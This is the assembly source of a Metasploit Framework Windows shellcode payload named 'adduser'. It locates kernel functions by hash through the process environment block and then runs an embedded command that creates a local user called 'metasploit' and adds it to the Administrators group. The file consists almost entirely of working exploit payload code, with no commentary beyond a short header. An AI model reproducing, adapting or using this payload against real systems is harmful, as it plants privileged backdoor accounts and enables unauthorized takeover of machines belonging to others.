;
; Metasploit Framework
; http://www.metasploit.com
;
; Source for adduser (single)
;
; Authors: hdm <hdm@metasploit.com>, vlad902 <vlad902@gmail.com>
; Size   : 198
;

cld
call startup
mov eax,[ebp+0x3c]
mov edi,[ebp+eax+0x78]
add edi,ebp
mov ecx,[edi+0x18]
mov ebx,[edi+0x20]
add ebx,ebp
next_entry:
dec ecx
mov esi,[ebx+ecx*4]
add esi,ebp
xor eax,eax
cdq
next_byte:
lodsb
test al,al
jz hash_complete
ror edx,0xd
add edx,eax
jmp short next_byte
hash_complete:
cmp edx,[esp+0x4]
jnz next_entry
mov ebx,[edi+0x24]
add ebx,ebp
mov cx,[ebx+ecx*2]
mov ebx,[edi+0x1c]
add ebx,ebp
mov ebx,[ebx+ecx*4]
add ebx,ebp
mov [esp+0x4],ebx
ret
startup:
pop edi
xor esi,esi
pusha
push esi
mov eax,[fs:esi+0x30]
mov eax,[eax+0xc]
mov esi,[eax+0x1c]
lodsd
mov ebp,[eax+0x8]
mov eax,edi
add eax,byte +0x6a
push eax
push dword 0x5f048af0
push dword 0xe8afe98
push edi
jmp edi
db "cmd.exe /c net user metasploit x /ADD && net localgroup Administrators metasploit /ADD"
